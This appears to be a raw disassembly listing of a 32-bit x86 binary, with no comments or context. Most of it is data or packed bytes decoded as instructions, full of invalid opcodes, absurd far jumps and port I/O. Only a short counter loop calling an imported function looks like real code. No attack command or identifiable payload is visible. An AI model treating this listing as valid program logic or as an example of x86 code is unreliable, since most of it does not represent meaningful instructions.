  405832:	cmp    eax,0x9c1a73a0
  405837:	jmp    0x61a9e504
  40583c:	les    esp,FWORD PTR [edi]
  40583e:	jp     0x4057df
  405840:	jle    0x4057f8
  405842:	push   ecx
  405843:	sub    edi,ecx
  405845:	ins    BYTE PTR es:[edi],dx
  405846:	and    eax,DWORD PTR [ebx+edi*8-0x3e3019e1]
  40584d:	ret    0x4ed4
  405850:	jg     0x405886
  405852:	dec    ebp
  405853:	jns    0x4057e8
  405855:	fiadd  WORD PTR ds:0x11fb5e92
  40585b:	(bad)  
  40585c:	js     0x4058cc
  40585e:	cmp    esi,DWORD PTR [esp+edx*4+0x7e]
  405862:	mov    ch,0xa3
  405864:	cmp    dh,dh
  405866:	hlt    
  405867:	fdivr  DWORD PTR [edx]
  405869:	jno    0x4057fb
  40586b:	gs or  ecx,ecx
  40586e:	pop    ds
  40586f:	pop    esp
  405870:	cmc    
  405871:	loop   0x40581e
  405873:	add    BYTE PTR [edi],al
  405875:	jne    0x405898
  405877:	repnz push edx
  405879:	pop    edi
  40587a:	inc    ebp
  40587b:	sbb    eax,0x1fc1d694
  405880:	lods   eax,DWORD PTR ds:[esi]
  405881:	jo     0x4058e2
  405883:	mov    edi,DWORD PTR [ebp+0x6b]
  405886:	mov    bh,0x22
  405888:	mov    ebp,0x7a8b435d
  40588d:	(bad)  
  40588e:	pop    ss
  40588f:	loopne 0x405868
  405891:	or     ecx,DWORD PTR ds:0x7b0ed370
  405897:	mov    dl,0xf5
  405899:	cwde   
  40589a:	iret   
  40589b:	dec    edx
  40589c:	fst    QWORD PTR [ebx-0x3f]
  40589f:	xor    eax,0x224ebda6
  4058a4:	jno    0x40589f
  4058a6:	(bad)  
  4058a7:	cwde   
  4058a8:	push   ss
  4058a9:	je     0x40583c
  4058ab:	sbb    al,0x8f
  4058ad:	mov    al,ds:0x3776a9e5
  4058b2:	mov    ecx,0xa75f92c6
  4058b7:	pop    edx
  4058b8:	mov    ds:0x23b5c10,al
  4058bd:	shl    DWORD PTR [ecx-0x4269642b],1
  4058c3:	aas    
  4058c4:	push   edi
  4058c5:	pop    ebp
  4058c6:	out    0x30,eax
  4058c8:	xor    al,0x85
  4058ca:	mov    edx,DWORD PTR [edx-0x4]
  4058cd:	test   BYTE PTR [edx],dh
  4058cf:	and    eax,0xd35c3988
  4058d4:	mov    ah,dl
  4058d6:	call   0x190d3495
  4058db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058dc:	jmp    0x4058ec
  4058de:	mov    al,ds:0x27d93878
  4058e3:	call   0xa4c0:0x938b5ada
  4058ea:	retf   
  4058eb:	sub    eax,0x56b99ff8
  4058f0:	rol    DWORD PTR [edi-0x43],1
  4058f3:	aaa    
  4058f4:	cs out dx,al
  4058f6:	push   ecx
  4058f7:	cs xchg esp,eax
  4058f9:	and    ax,0x9e9
  4058fd:	mov    cl,bl
  4058ff:	jmp    0x40594f
  405901:	cld    
  405902:	dec    esi
  405903:	or     ecx,ebp
  405905:	retf   
  405906:	add    DWORD PTR [ebp+0x3e013a3a],ebp
  40590c:	loop   0x40593b
  40590e:	int    0xda
  405910:	call   0xf26ef2a7
  405915:	sub    bh,BYTE PTR [ebx-0x1f815735]
  40591b:	daa    
  40591c:	jg     0x40595d
  40591e:	in     eax,dx
  40591f:	dec    eax
  405920:	je     0x405966
  405922:	xor    BYTE PTR [edx+0x27ddc037],0x14
  405929:	daa    
  40592a:	shr    DWORD PTR [edx-0x57],1
  40592d:	push   edx
  40592e:	pop    ebx
  40592f:	push   0x1ccd7461
  405934:	mov    BYTE PTR [ebx],dl
  405936:	pop    edx
  405937:	or     eax,0x1faf2c27
  40593c:	pop    eax
  40593d:	add    DWORD PTR es:[ebp-0x30],esp
  405941:	in     al,dx
  405942:	ret    
  405943:	or     edx,ebp
  405945:	cmp    DWORD PTR [ebx],0x50
  405948:	pop    es
  405949:	xor    eax,DWORD PTR [edx-0x12]
  40594c:	add    ebx,esi
  40594e:	aas    
  40594f:	imul   ebx,DWORD PTR [eax+edi*1+0x2324bdeb],0x9
  405957:	mov    ch,0x77
  405959:	sub    ah,BYTE PTR [ebp-0x7eee3576]
  40595f:	mov    ds:0xef1b9559,al
  405964:	inc    ebx
  405965:	mov    ebx,DWORD PTR [edx]
  405967:	outs   dx,BYTE PTR ds:[esi]
  405968:	bound  esi,QWORD PTR [esi+ebp*1]
  40596b:	repnz cmp DWORD PTR [ebp+0x72],ebp
  40596f:	dec    esp
  405970:	adc    eax,0x64e53a22
  405975:	mov    ?,WORD PTR [edi+edi*1-0x5d]
  405979:	pop    eax
  40597a:	iret   
  40597b:	in     al,0xdd
  40597d:	(bad)  
  40597e:	fwait
  40597f:	mov    cl,0xe2
  405981:	mov    dh,0x75
  405983:	loop   0x405920
  405985:	jbe    0x40597b
  405987:	adc    al,0x3b
  405989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40598a:	es out dx,al
  40598c:	in     al,0x35
  40598e:	mov    dl,0xf
  405990:	mov    eax,0x64c1bcd
  405995:	ins    DWORD PTR es:[edi],dx
  405996:	pop    ecx
  405997:	dec    edi
  405998:	(bad)  
  405999:	lods   eax,DWORD PTR ds:[esi]
  40599a:	sub    DWORD PTR [edi],ebp
  40599c:	inc    esp
  40599d:	rol    al,cl
  40599f:	xchg   ebp,eax
  4059a0:	stos   BYTE PTR es:[edi],al
  4059a1:	call   0xe77d:0x442167ec
  4059a8:	jo     0x40594e
  4059aa:	jbe    0x405a15
  4059ac:	pop    edx
  4059ad:	ficomp DWORD PTR ds:0x95c6a5f8
  4059b3:	out    0x1,eax
  4059b5:	in     al,dx
  4059b6:	adc    DWORD PTR [esi],0xd90618b0
  4059bc:	lods   al,BYTE PTR ds:[esi]
  4059bd:	loopne 0x405998
  4059bf:	add    eax,0x1c659cde
  4059c4:	(bad)  [ebp-0x618aaad2]
  4059ca:	ins    DWORD PTR es:[edi],dx
  4059cb:	(bad)  [eax]
  4059cd:	push   esi
  4059ce:	out    dx,eax
  4059cf:	xor    ch,BYTE PTR [ebx+0xf3f494b]
  4059d5:	gs and eax,0x4ab47011
  4059db:	cld    
  4059dc:	das    
  4059dd:	jmp    0x4059aa
  4059df:	or     eax,0x7b524415
  4059e4:	or     al,0x92
  4059e6:	and    eax,0x72b4cb78
  4059eb:	inc    esi
  4059ec:	mov    bl,0xc4
  4059ee:	pop    ecx
  4059ef:	push   ebp
  4059f0:	pop    ecx
  4059f1:	jge    0x405a39
  4059f3:	loop   0x4059dc
  4059f5:	sub    BYTE PTR [ebx],dh
  4059f7:	js     0x405a20
  4059f9:	sbb    eax,0x13df86b5
  4059fe:	mov    BYTE PTR [ebp+0x7049d82d],al
  405a04:	inc    ebp
  405a05:	fild   DWORD PTR [edx]
  405a07:	pop    ds
  405a08:	pop    eax
  405a09:	jge    0x405a68
  405a0b:	stc    
  405a0c:	retf   
  405a0d:	int    0x39
  405a0f:	ret    
  405a10:	sub    BYTE PTR [edi-0x1f],0x33
  405a14:	leave  
  405a15:	sub    bh,dl
  405a17:	int3   
  405a18:	rol    BYTE PTR [esi],0x4f
  405a1b:	jns    0x4059c6
  405a1d:	mov    ecx,0xaf7e3935
  405a23:	popa   
  405a24:	dec    ebp
  405a25:	into   
  405a26:	fiadd  WORD PTR [esi+0x62f06a1a]
  405a2c:	and    eax,0xf0458bfd
  405a31:	dec    ebx
  405a32:	mov    DWORD PTR [ebp-0x24],eax
  405a35:	adc    eax,ecx
  405a37:	mov    eax,DWORD PTR [ebp-0x1c]
  405a3a:	mov    DWORD PTR [ebp-0x20],eax
  405a3d:	add    eax,eax
  405a3f:	mov    ebx,0xf89c853c
  405a44:	sbb    DWORD PTR ds:0x42a355,0x49a8
  405a4e:	mov    DWORD PTR [ebp-0x50],ebx
  405a51:	jmp    0x405f5c
  405a56:	retf   0xd1c9
  405a59:	rcl    cl,1
  405a5b:	ror    cl,1
  405a5d:	fsin   
  405a5f:	sbb    DWORD PTR [ecx],ebp
  405a61:	pop    es
  405a62:	jnp    0x405a95
  405a64:	mov    bl,0xac
  405a66:	jl     0x405a2b
  405a68:	js     0x405ae2
  405a6a:	push   0x7c
  405a6c:	js     0x405ae6
  405a6e:	js     0x405a82
  405a70:	push   0x58
  405a72:	mov    dl,0xe8
  405a74:	jmp    0x405a8f
  405a76:	dec    edx
  405a77:	fwait
  405a78:	cmp    esi,DWORD PTR [ebp-0x51549214]
  405a7e:	pop    esp
  405a7f:	cmp    eax,0xedaaaf35
  405a84:	xor    ebx,eax
  405a86:	jno    0x405a12
  405a88:	mov    ah,0xba
  405a8a:	lods   al,BYTE PTR ds:[esi]
  405a8b:	push   ds
  405a8c:	or     BYTE PTR [ecx+ebx*8],al
  405a8f:	sbb    eax,0xa11dcd14
  405a94:	daa    
  405a95:	or     DWORD PTR [esi-0x5d],ecx
  405a98:	inc    ecx
  405a99:	cmp    eax,0x85916a6f
  405a9e:	inc    esp
  405a9f:	cmp    BYTE PTR [ecx],dl
  405aa1:	pop    ecx
  405aa2:	ror    BYTE PTR ss:[edx],cl
  405aa5:	xchg   edx,eax
  405aa6:	ins    DWORD PTR es:[edi],dx
  405aa7:	sub    al,0x8
  405aa9:	jne    0x405b1a
  405aab:	cwde   
  405aac:	cmp    eax,0xfc4b5f01
  405ab1:	jg     0x405ac9
  405ab3:	mov    WORD PTR [edx+0x174f0df],fs
  405ab9:	imul   ecx,DWORD PTR [esi-0x4332e5da],0x2a0173aa
  405ac3:	inc    ecx
  405ac4:	inc    ebp
  405ac5:	das    
  405ac6:	scas   al,BYTE PTR es:[edi]
  405ac7:	rcl    DWORD PTR [esi],cl
  405ac9:	pop    eax
  405aca:	xchg   ebp,eax
  405acb:	jno    0x405a64
  405acd:	addr16 mov ecx,0x669a0a8e
  405ad3:	ret    0x5d29
  405ad6:	inc    eax
  405ad7:	mov    ds:0x18fb8c4e,al
  405adc:	es push esi
  405ade:	mov    ah,0x2
  405ae0:	and    DWORD PTR [esi+0x10],esp
  405ae3:	sub    DWORD PTR [ecx],ecx
  405ae5:	mov    cl,0x35
  405ae7:	push   ss
  405ae8:	and    eax,0x7e9e12e1
  405aed:	call   0xa650:0x237c9d61
  405af4:	fild   WORD PTR [edx-0x3a]
  405af7:	add    BYTE PTR [eax-0x7d],al
  405afa:	dec    esi
  405afb:	or     cl,BYTE PTR [ebx]
  405afd:	(bad)  
  405afe:	fstp   QWORD PTR [esi]
  405b00:	or     dl,BYTE PTR [ecx-0x2015d8c1]
  405b06:	shl    DWORD PTR [ebp+0x34f2ff44],1
  405b0c:	dec    esp
  405b0d:	xchg   ebp,eax
  405b0e:	daa    
  405b0f:	sub    cl,dl
  405b11:	leave  
  405b12:	pop    ds
  405b13:	and    ebp,0x3f
  405b16:	pop    ss
  405b17:	test   eax,0xd46c30a
  405b1c:	jl     0x405aaf
  405b1e:	push   esi
  405b1f:	cli    
  405b20:	add    al,0x3a
  405b22:	loop   0x405b0f
  405b24:	pop    esp
  405b25:	stos   DWORD PTR es:[edi],eax
  405b26:	bound  edx,QWORD PTR [edx-0x6b]
  405b29:	sbb    DWORD PTR [ebp-0x777535dc],edi
  405b2f:	jbe    0x405ba1
  405b31:	fldenv [ebx-0x6a039f9]
  405b37:	push   edi
  405b38:	test   eax,0x4dabd558
  405b3d:	push   0x34
  405b3f:	retf   0x8ae6
  405b42:	addr16 (bad) 
  405b44:	in     eax,dx
  405b45:	xchg   edx,eax
  405b46:	push   eax
  405b47:	ins    BYTE PTR es:[edi],dx
  405b48:	je     0x405b83
  405b4a:	or     dl,0x12
  405b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b4e:	repz inc esi
  405b50:	adc    ebx,DWORD PTR [eax]
  405b52:	or     bh,BYTE PTR [eax]
  405b54:	push   cs
  405b55:	std    
  405b56:	ja     0x405aed
  405b58:	sub    eax,0x9bc549c1
  405b5d:	cwde   
  405b5e:	mov    ecx,0x516a8c54
  405b63:	xchg   esi,eax
  405b64:	pushf  
  405b65:	pop    ebp
  405b66:	pop    esi
  405b67:	mov    edi,0xa1fdc073
  405b6c:	aas    
  405b6d:	aaa    
  405b6e:	jo     0x405bd6
  405b70:	xchg   edx,eax
  405b71:	adc    ecx,DWORD PTR [esi-0x13]
  405b74:	enter  0xf69c,0x2
  405b78:	xchg   edx,eax
  405b79:	inc    esp
  405b7a:	lock adc al,0x49
  405b7d:	pop    edi
  405b7e:	stos   BYTE PTR es:[edi],al
  405b7f:	leave  
  405b80:	ins    BYTE PTR es:[edi],dx
  405b81:	dec    esi
  405b82:	mov    cl,cl
  405b84:	xchg   ecx,eax
  405b85:	jns    0x405b20
  405b87:	dec    edx
  405b88:	int3   
  405b89:	xor    dl,dl
  405b8b:	stc    
  405b8c:	fsubr  st(3),st
  405b8e:	(bad)  
  405b90:	ret    0x7053
  405b93:	jns    0x405b70
  405b95:	cdq    
  405b96:	mov    eax,DWORD PTR [ecx+0x15dc0164]
  405b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b9d:	pop    esi
  405b9e:	pop    edx
  405b9f:	mov    dh,0xc3
  405ba1:	fwait
  405ba2:	sub    esi,esi
  405ba4:	rcl    BYTE PTR [edx+0x187bb1b],0x57
  405bab:	fcmovbe st,st(1)
  405bad:	xchg   esi,eax
  405bae:	out    dx,al
  405baf:	dec    esi
  405bb0:	xor    cl,cl
  405bb2:	xlat   BYTE PTR ds:[ebx]
  405bb3:	inc    eax
  405bb4:	mov    al,ds:0x98a84d6
  405bb9:	pop    esp
  405bba:	push   edx
  405bbb:	test   eax,0x5e89bebf
  405bc0:	adc    eax,0x42fd13a8
  405bc5:	lds    esp,FWORD PTR [edi+edi*2-0x5fe04515]
  405bcc:	ficom  DWORD PTR [ecx]
  405bce:	and    esi,esi
  405bd0:	push   ebx
  405bd1:	mov    dh,dh
  405bd3:	cs sub esp,ecx
  405bd6:	jnp    0x405c11
  405bd8:	out    0x51,eax
  405bda:	(bad)  
  405bdb:	outs   dx,DWORD PTR ds:[esi]
  405bdc:	add    DWORD PTR [ebx+0x72cab70],ebp
  405be2:	sbb    ch,cl
  405be4:	xchg   esp,eax
  405be5:	mov    DWORD PTR [edi-0x19b62192],ebp
  405beb:	enter  0x4b98,0x8f
  405bef:	jmp    0x405c17
  405bf1:	les    eax,FWORD PTR [ebx]
  405bf3:	jge    0x405bc8
  405bf5:	out    0x5d,al
  405bf7:	sahf   
  405bf8:	xor    dl,dh
  405bfa:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bfc:	inc    eax
  405bfd:	push   esi
  405bfe:	imul   ebx,esi,0xffffffdc
  405c01:	xlat   BYTE PTR ds:[ebx]
  405c02:	and    eax,0xe4a2288c
  405c07:	test   BYTE PTR [ebx+0x7b81f851],bl
  405c0d:	lods   al,BYTE PTR ds:[esi]
  405c0e:	and    dh,ah
  405c10:	xor    ebx,0xf
  405c13:	jge    0x405bb4
  405c15:	popf   
  405c16:	jle    0x405b9b
  405c18:	mov    ah,0x38
  405c1a:	mov    ds:0xac053f96,al
  405c1f:	mov    dl,0x56
  405c21:	and    DWORD PTR [bx],esp
  405c24:	out    0x87,al
  405c26:	mov    ds:0x63fbad8e,eax
  405c2b:	or     eax,0x5aae5986
  405c30:	ror    ebx,cl
  405c32:	pop    esp
  405c33:	xchg   ebp,eax
  405c34:	adc    bl,cl
  405c36:	push   eax
  405c37:	push   eax
  405c38:	outs   dx,BYTE PTR ds:[esi]
  405c39:	sub    bl,BYTE PTR [ebx]
  405c3b:	fcomp  QWORD PTR [edx+0x61edd9cd]
  405c41:	cmp    al,0x88
  405c43:	jbe    0x405caa
  405c45:	fsubp  st(3),st
  405c47:	shl    DWORD PTR [edi-0x7e],0x2
  405c4b:	xchg   ecx,eax
  405c4c:	sbb    al,bh
  405c4e:	and    ah,BYTE PTR [edi+0x12]
  405c51:	mov    ds:0x14438288,eax
  405c56:	xor    eax,0xa2189313
  405c5b:	mov    cl,BYTE PTR [edx-0x1c5a6e8b]
  405c61:	repnz mov al,ds:0xb41b5b07
  405c67:	popf   
  405c68:	xchg   BYTE PTR [esi+0x28],ah
  405c6b:	sbb    eax,0x694fad05
  405c70:	mov    esp,0xd0a93f2b
  405c75:	mov    ebp,0x28adb7ea
  405c7a:	mov    esp,ecx
  405c7c:	dec    ebp
  405c7d:	out    dx,al
  405c7e:	jg     0x405cfc
  405c80:	(bad)  
  405c81:	or     DWORD PTR [eax+0x10],esi
  405c84:	and    ebx,0xcb2eddc
  405c8a:	cs in  eax,0xa1
  405c8d:	dec    edx
  405c8e:	je     0x405d0f
  405c90:	cs in  al,dx
  405c92:	stc    
  405c93:	test   eax,0x89c37011
  405c98:	push   ebx
  405c99:	cmc    
  405c9a:	adc    al,BYTE PTR [eax]
  405c9c:	outs   dx,DWORD PTR ds:[esi]
  405c9d:	mov    BYTE PTR [ebx],al
  405c9f:	mov    ds:0xa3ea5b1f,eax
  405ca4:	(bad)  
  405ca6:	mov    ebp,0x98efcd3
  405cab:	jle    0x405d11
  405cad:	jmp    0x7d95:0xa9d97ee6
  405cb4:	sbb    eax,0xc28f4dd0
  405cb9:	mov    dh,0x85
  405cbb:	mov    cs,WORD PTR [edi+0x343f79ae]
  405cc1:	ror    ah,1
  405cc3:	dec    ebp
  405cc4:	ror    DWORD PTR [eax+eax*8],0xab
  405cc8:	cmp    al,0xf5
  405cca:	jle    0x405c7d
  405ccc:	pop    edx
  405ccd:	xchg   ebp,eax
  405cce:	pop    esi
  405ccf:	mov    ch,0xd5
  405cd1:	adc    DWORD PTR [ecx+0x2a],esi
  405cd4:	jge    0x405cce
  405cd6:	xor    al,dl
  405cd8:	add    dh,ch
  405cda:	mov    eax,0xce2ab690
  405cdf:	mov    ?,ebx
  405ce1:	les    ebp,FWORD PTR [eax]
  405ce3:	jo     0x405cce
  405ce5:	sar    DWORD PTR [edx*4+0x582a270d],1
  405cec:	retf   
  405ced:	xchg   edx,eax
  405cee:	adc    esi,DWORD PTR [edx+0x45]
  405cf1:	sti    
  405cf2:	and    ebx,ecx
  405cf4:	rcl    DWORD PTR [ecx],0xef
  405cf7:	std    
  405cf8:	sti    
  405cf9:	pop    eax
  405cfa:	stos   BYTE PTR es:[edi],al
  405cfb:	xchg   ecx,eax
  405cfc:	imul   ebx,DWORD PTR [ebx+0x3b],0xad421405
  405d03:	push   0x10d47cdb
  405d08:	mov    ch,0xa
  405d0a:	push   ds
  405d0b:	sub    ch,BYTE PTR [edx+0x786e280e]
  405d11:	in     eax,dx
  405d12:	dec    esp
  405d13:	ins    DWORD PTR es:[edi],dx
  405d14:	repz int3 
  405d16:	sbb    eax,0x6fad97e2
  405d1b:	int3   
  405d1c:	push   ebx
  405d1d:	adc    eax,0xfb99363b
  405d22:	push   eax
  405d23:	mov    esi,0x8b1edfaa
  405d28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d29:	adc    al,cl
  405d2b:	sbb    al,0x4d
  405d2d:	dec    eax
  405d2e:	fsub   DWORD PTR [ebp-0x6778b17c]
  405d34:	xchg   edx,eax
  405d35:	or     bh,BYTE PTR [ecx]
  405d37:	outs   dx,BYTE PTR ds:[esi]
  405d38:	inc    edx
  405d39:	pushf  
  405d3a:	add    bl,BYTE PTR [ebx+0x1c]
  405d3d:	pushf  
  405d3e:	jecxz  0x405d3d
  405d40:	adc    eax,0x6a4900
  405d46:	push   edx
  405d47:	mov    dh,0x2
  405d49:	aad    0x33
  405d4b:	cmc    
  405d4c:	jno    0x405d4a
  405d4e:	sub    eax,0x8c2046ef
  405d53:	add    eax,0xb196f65e
  405d58:	pop    edx
  405d59:	sbb    ebp,DWORD PTR [edx]
  405d5b:	sbb    ecx,DWORD PTR [eax]
  405d5d:	mov    al,BYTE PTR [ecx+ebp*1-0x4a]
  405d61:	ds jb  0x405ddf
  405d64:	xchg   esp,eax
  405d65:	fbstp  TBYTE PTR [edx]
  405d67:	pop    es
  405d68:	adc    eax,0x1bb4f727
  405d6d:	sub    ebp,esi
  405d6f:	outs   dx,BYTE PTR ds:[si]
  405d71:	cwde   
  405d72:	lds    ebx,FWORD PTR [ebp+0x56]
  405d75:	pop    es
  405d76:	in     eax,0x80
  405d78:	bound  esi,QWORD PTR [ecx-0x2eae9124]
  405d7e:	ja     0x405def
  405d80:	pop    eax
  405d81:	jmp    0xe714:0x96998e71
  405d88:	rol    DWORD PTR [ecx+0x40401227],cl
  405d8e:	jmp    0x405df7
  405d90:	imul   edi,ebp,0x14daf5b
  405d96:	loope  0x405d39
  405d98:	xchg   ebp,eax
  405d99:	loope  0x405d6e
  405d9b:	inc    ebx
  405d9c:	xor    al,0x36
  405d9e:	dec    ebp
  405da0:	rol    dh,cl
  405da2:	jge    0x405d48
  405da4:	es xor eax,0x2d25b327
  405daa:	push   cs
  405dab:	pop    ss
  405dac:	icebp  
  405dad:	pusha  
  405dae:	icebp  
  405daf:	(bad)  
  405db1:	inc    ebp
  405db2:	jns    0x405d72
  405db4:	cmp    al,0xd2
  405db6:	nop
  405db7:	fidivr WORD PTR [ebx+0x2bbf0b2]
  405dbd:	xchg   edi,eax
  405dbe:	int    0x80
  405dc0:	or     BYTE PTR [ecx-0x134f74e],ah
  405dc6:	push   esp
  405dc7:	popa   
  405dc8:	sub    BYTE PTR [edx+0xc65cf31],dh
  405dce:	(bad)  
  405dcf:	xor    DWORD PTR [edi],ebp
  405dd1:	cmp    esp,edi
  405dd3:	jb     0x405d8d
  405dd5:	push   esi
  405dd6:	add    BYTE PTR [ebx-0x6ec1024c],al
  405ddc:	adc    edi,eax
  405dde:	icebp  
  405ddf:	mov    ah,0x80
  405de1:	or     dl,ch
  405de3:	push   ecx
  405de4:	push   ss
  405de5:	jnp    0x405e1b
  405de7:	or     eax,0x901092f9
  405dec:	gs (bad) 
  405dee:	out    0x24,al
  405df0:	push   ss
  405df1:	aad    0x10
  405df3:	push   ds
  405df4:	mov    esp,0x4ffe2356
  405df9:	sub    al,0x0
  405dfb:	adc    BYTE PTR [ecx+esi*4],0xd7
  405dff:	stos   BYTE PTR es:[edi],al
  405e00:	hlt    
  405e01:	xor    eax,0x3d0505b2
  405e06:	mov    esp,DWORD PTR [edi+ecx*1+0x5d]
  405e0a:	(bad)  
  405e0b:	mov    ebx,0x9cf846a
  405e10:	inc    edx
  405e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e12:	test   al,0xa5
  405e14:	sub    BYTE PTR [edx-0x11],ch
  405e17:	mov    edx,0x4f2e7b9e
  405e1c:	push   esi
  405e1d:	jnp    0x405dcb
  405e1f:	sbb    edi,DWORD PTR [ecx+0x3e]
  405e22:	inc    esp
  405e23:	dec    edi
  405e24:	lahf   
  405e25:	out    dx,eax
  405e26:	sahf   
  405e27:	scas   al,BYTE PTR es:[edi]
  405e28:	(bad)  
  405e29:	sbb    esi,DWORD PTR [edx-0x7059ecc1]
  405e2f:	(bad)  
  405e30:	xchg   ebx,eax
  405e31:	lock and DWORD PTR [ebp+esi*8+0x3b],ebx
  405e36:	mov    ds:0x8c9c78e,eax
  405e3b:	and    bh,0x2d
  405e3e:	push   ecx
  405e3f:	cs xor al,0x6a
  405e42:	ins    DWORD PTR es:[edi],dx
  405e43:	lds    eax,FWORD PTR [eax]
  405e45:	cli    
  405e46:	pop    esi
  405e47:	test   BYTE PTR [edi+0x19],dl
  405e4a:	loopne 0x405e08
  405e4c:	lds    edx,FWORD PTR [edx]
  405e4e:	lods   al,BYTE PTR ds:[esi]
  405e4f:	xchg   ebx,eax
  405e50:	es push ebp
  405e52:	mov    al,ds:0x86d4a354
  405e57:	xchg   cl,cl
  405e59:	xchg   edx,eax
  405e5a:	inc    ecx
  405e5b:	in     eax,0x66
  405e5d:	test   eax,0xc4fc3fd0
  405e62:	or     DWORD PTR [ebx],0xffffffa1
  405e65:	xor    eax,0x57609e35
  405e6a:	outs   dx,DWORD PTR ds:[esi]
  405e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e6c:	jmp    0x82b9:0x37582eb3
  405e73:	ds enter 0x16e2,0x5e
  405e78:	int3   
  405e79:	retf   
  405e7a:	into   
  405e7b:	xor    eax,0xc364090a
  405e80:	push   esp
  405e81:	popf   
  405e82:	sbb    edx,ebx
  405e84:	mov    ebx,DWORD PTR [edx+edx*4+0x23]
  405e88:	or     al,0x5f
  405e8a:	dec    esp
  405e8b:	mov    edx,0x3421cf74
  405e90:	sub    ah,dh
  405e92:	mov    DWORD PTR [esi],0xe57194d8
  405e98:	bound  esp,QWORD PTR [edi]
  405e9a:	out    dx,eax
  405e9b:	cli    
  405e9c:	sub    esi,DWORD PTR ds:0x95b95060
  405ea2:	mov    edx,0xdcdf8fa8
  405ea8:	shr    BYTE PTR [esi-0x18c98984],1
  405eae:	ss cmp eax,0x76e7234b
  405eb4:	mov    bl,BYTE PTR [edx-0x671de2e2]
  405eba:	cli    
  405ebb:	dec    eax
  405ebc:	int    0x43
  405ebe:	rol    esp,1
  405ec0:	dec    edi
  405ec1:	xor    DWORD PTR [esi+ecx*4+0xfa79286],ebx
  405ec8:	adc    al,0x59
  405eca:	popa   
  405ecb:	xchg   ebx,eax
  405ecc:	pop    ss
  405ecd:	imul   eax,DWORD PTR [eax-0x75],0xea448b1c
  405ed4:	imul   ecx,DWORD PTR [edx],0xa1c225fe
  405eda:	or     DWORD PTR [eax+esi*2+0x390a89c5],eax
  405ee1:	mov    ah,0xd2
  405ee3:	sbb    BYTE PTR [ecx+0x1b],dl
  405ee6:	dec    eax
  405ee7:	out    dx,eax
  405ee8:	loopne 0x405f54
  405eea:	not    BYTE PTR [ecx]
  405eec:	jne    0x405eea
  405eee:	clc    
  405eef:	ja     0x405e80
  405ef1:	sub    ebx,eax
  405ef3:	xchg   ebx,eax
  405ef4:	jmp    0x1b76:0xa8ae5748
  405efb:	fucomp st(7)
  405efd:	test   BYTE PTR ds:0x309c5369,dh
  405f03:	outs   dx,DWORD PTR ds:[esi]
  405f04:	jmp    0xb880989c
  405f09:	adc    eax,0x2a650dcb
  405f0e:	inc    eax
  405f0f:	mov    esp,0x80250629
  405f14:	fiadd  DWORD PTR [eax+edx*2+0x69]
  405f18:	pushf  
  405f19:	leave  
  405f1a:	(bad)  [ecx+0x5d02b3a5]
  405f20:	xor    DWORD PTR [edi+ebx*1],ebp
  405f23:	cwde   
  405f24:	sub    al,0x41
  405f26:	pushf  
  405f27:	(bad)  
  405f29:	sbb    edx,DWORD PTR [ecx+0x2b]
  405f2c:	and    edi,DWORD PTR [ebp+0x63]
  405f2f:	xchg   edi,eax
  405f30:	inc    ecx
  405f31:	js     0x405ec1
  405f33:	lock xor DWORD PTR [ebp+0x452adf93],0xc0c3d718
  405f3e:	cmp    DWORD PTR [ecx+0x524e8596],esp
  405f44:	icebp  
  405f45:	lock and dh,BYTE PTR [esi]
  405f48:	pop    ebx
  405f49:	cmp    ebx,DWORD PTR [esi-0x3ca48d73]
  405f4f:	jbe    0x405fcc
  405f51:	retf   0x49f5
  405f54:	mov    al,ds:0x519e700a
  405f59:	jo     0x405f06
  405f5b:	pop    ebx
  405f5c:	mov    eax,DWORD PTR [ebp-0x50]
  405f5f:	mov    DWORD PTR ds:0x42a351,0x15
  405f69:	cmp    DWORD PTR ds:0x42a351,0x0
  405f70:	je     0x4064b0
  405f76:	cmp    DWORD PTR ds:0x42a351,0x19
  405f7d:	jne    0x405f93
  405f83:	push   0x42a361
  405f88:	push   0x42a643
  405f8d:	call   DWORD PTR ds:0x4251d8
  405f93:	mov    ecx,DWORD PTR ds:0x42a351
  405f99:	dec    ecx
  405f9a:	mov    DWORD PTR ds:0x42a351,ecx
  405fa0:	jmp    0x405f69
  405fa5:	jmp    0x4064b0
  405faa:	ret    0xcd3e
  405fad:	rcl    cl,cl
  405faf:	rol    ecx,1
  405fb1:	into   
  405fb2:	push   es
  405fb3:	cmc    
  405fb4:	loope  0x405fa7
  405fb6:	lahf   
  405fb7:	sbb    eax,0xc76e1e21
  405fbc:	js     0x406036
  405fbe:	push   0x7c
  405fc0:	js     0x40603a
  405fc2:	jge    0x405f97
  405fc4:	call   0x678:0x86737f7
  405fcb:	push   esp
  405fcc:	or     eax,0x66262282
  405fd1:	dec    BYTE PTR [edx-0x71]
  405fd4:	in     eax,0x9b
  405fd6:	pop    ebp
  405fd7:	push   cs
  405fd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fd9:	je     0x405f9b
  405fdb:	out    0x11,eax
  405fdd:	or     edi,DWORD PTR [edx]
  405fdf:	pop    es
  405fe0:	push   ebx
  405fe1:	ret    
  405fe2:	das    
  405fe3:	add    eax,DWORD PTR [ebp-0x29]
  405fe6:	or     al,0x81
  405fe8:	gs cmp dl,dl
  405feb:	or     bh,ch
  405fed:	pop    esp
  405fee:	lock push ebx
  405ff0:	jp     0x40603a
  405ff2:	add    DWORD PTR [ebx+0x44],ebx
  405ff5:	push   ebx
  405ff6:	mov    al,0x72
  405ff8:	in     eax,0x50
  405ffa:	jmp    0x405fba
  405ffc:	sar    ch,cl
  405ffe:	cs ret 0xcf4d
  406002:	dec    esi
  406003:	aad    0xac
  406005:	enter  0x925a,0x19
  406009:	mov    WORD PTR [ecx+0x1432b135],gs
  40600f:	(bad)  
  406010:	ins    DWORD PTR es:[edi],dx
  406011:	or     bh,BYTE PTR [edx]
  406013:	and    ah,BYTE PTR [edx-0x33c2051c]
  406019:	fst    st(4)
  40601b:	mov    es,esp
  40601d:	fadd   QWORD PTR [ebx+ecx*1]
  406020:	pop    ds
  406021:	inc    ebx
  406022:	xor    dh,BYTE PTR [edx]
  406024:	adc    dh,BYTE PTR [edx]
  406026:	pop    edi
  406027:	push   ebp
  406028:	leave  
